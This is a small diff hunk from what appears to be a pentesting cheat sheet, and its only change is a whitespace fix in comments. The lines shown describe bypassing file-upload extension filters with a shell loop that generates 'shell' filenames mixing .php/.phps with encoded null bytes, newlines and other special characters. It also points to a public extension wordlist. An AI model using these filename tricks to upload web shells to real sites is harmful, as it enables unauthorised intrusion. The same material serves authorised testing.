@@ -25,14 +25,14 @@
 // you can brute force using :
 // https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
 //* bypass extention filtering by using encoding & special characters
-//for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':'; do
+// for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':'; do
 //    for ext in '.php' '.phps'; do
 //        echo "shell$char$ext.jpg" >> wordlist.txt
 //        echo "shell$ext$char.jpg" >> wordlist.txt
 //        echo "shell.jpg$char$ext" >> wordlist.txt
 //        echo "shell.jpg$ext$char" >> wordlist.txt
 //    done
-//done
+// done
 //* bypass whitlist only extensions
 // by adding filename with extended filename*
 // ex:
